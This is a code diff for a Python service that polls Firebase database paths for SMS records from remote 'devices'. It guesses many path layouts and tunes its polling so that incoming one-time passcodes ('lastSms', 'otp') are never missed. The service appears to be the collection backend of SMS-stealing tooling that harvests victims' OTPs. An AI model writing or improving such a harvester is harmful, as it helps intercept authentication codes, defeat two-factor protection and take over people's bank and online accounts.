@@ -17,13 +17,12 @@ from app.services import get_active_device, get_monitor_profile, save_sms
 
 logger = logging.getLogger(__name__)
 
-POLL_INTERVAL_SEC = 1.2
+POLL_INTERVAL_SEC = 2.0
 POLL_FETCH_TIMEOUT_SEC = 3.0
 SNAPSHOT_TIMEOUT_SEC = 8.0
 MONITORING_START_SNAPSHOT_SEC = 6.0
-MAX_POLL_PATHS_FALLBACK = 28
-MAX_POLL_PATHS_HOT = 14
-POLL_PROFILE_CONCURRENCY = 3
+MAX_POLL_PATHS_FALLBACK = 32
+POLL_PROFILE_CONCURRENCY = 2
 SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
 SMS_CHILD_PATHS = (
     "sms",
@@ -606,34 +605,21 @@ def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
     return list(deduped.values())
 
 
-def _build_otp_priority_paths(device: Device) -> list[str]:
-    """Small hot set — always polled so lastSms/otp updates are not missed."""
-    priority: list[str] = []
-    if device.firebase_key:
-        fk = device.firebase_key.strip("/")
-        priority.extend(
-            [
-                fk,
-                f"{fk}/sms",
-                f"{fk}/messages",
-                f"{fk}/lastSms",
-                f"{fk}/otp",
-                f"{fk}/inbox",
-            ]
-        )
+def _build_otp_sidecar_paths(device: Device) -> list[str]:
+    """Only 3 paths — merged every poll so lastSms OTP is never missed."""
+    sidecar: list[str] = []
     for device_id in _device_ids(device):
-        priority.extend(
+        sidecar.extend(
             [
-                f"clients/{device_id}/sms",
-                f"clients/{device_id}/messages",
                 f"clients/{device_id}/lastSms",
                 f"clients/{device_id}/otp",
-                f"clients/{device_id}/inbox",
-                f"messages/{device_id}",
-                f"sms/{device_id}",
+                f"clients/{device_id}/sms",
             ]
         )
-    return priority
+    if device.firebase_key:
+        fk = device.firebase_key.strip("/")
+        sidecar.extend([f"{fk}/lastSms", f"{fk}/otp", f"{fk}/sms"])
+    return list(dict.fromkeys(sidecar))[:6]
 
 
 _poll_cycle: dict[int, int] = {}
@@ -649,20 +635,49 @@ async def fetch_firebase_sms_for_device(
     root = firebase_root_url(firebase_url)
     cycle = _poll_cycle.get(device.id, 0) + 1
     _poll_cycle[device.id] = cycle
-    force_full = force_full or cycle % 8 == 0
+    force_full = force_full or cycle % 6 == 0
 
-    priority = _build_otp_priority_paths(device)
-    cached_paths = [] if force_full else get_cached_sms_paths(device)[:8]
-    if force_full:
-        extra = _generate_sms_paths(device)
-        ordered = list(dict.fromkeys(priority + cached_paths + extra))[:MAX_POLL_PATHS_FALLBACK]
-    else:
-        ordered = list(dict.fromkeys(priority + cached_paths))[:MAX_POLL_PATHS_HOT]
+    sidecar_paths = _build_otp_sidecar_paths(device)
+    sidecar_records, _ = await _fetch_paths_parallel(root, sidecar_paths, timeout=timeout)
 
+    cached_paths = [] if force_full else get_cached_sms_paths(device)
+    if cached_paths and not force_full:
+        cached_records, hit_paths = await _fetch_paths_parallel(
+            root,
+            cached_paths,
+            timeout=timeout,
+        )
+        if hit_paths:
+            set_cached_sms_paths(device, hit_paths)
+        merged = _dedupe_records(sidecar_records + cached_records)
+        if merged:
+            return merged
+
+    all_paths = _generate_sms_paths(device)
+    priority: list[str] = []
+    if device.firebase_key:
+        fk = device.firebase_key.strip("/")
+        priority.extend(
+            [
+                fk,
+                f"{fk}/sms",
+                f"{fk}/lastSms",
+                f"{fk}/inbox",
+            ]
+        )
+    for device_id in _device_ids(device):
+        priority.extend(
+            [
+                f"clients/{device_id}/sms",
+                f"clients/{device_id}/lastSms",
+                f"clients/{device_id}/inbox",
+            ]
+        )
+    ordered = list(dict.fromkeys(priority + all_paths))[:MAX_POLL_PATHS_FALLBACK]
     all_records, hit_paths = await _fetch_paths_parallel(root, ordered, timeout=timeout)
     if hit_paths:
         set_cached_sms_paths(device, hit_paths)
-    return _dedupe_records(all_records)
+    return _dedupe_records(sidecar_records + all_records)
 
 
 async def snapshot_firebase_sms_seen(
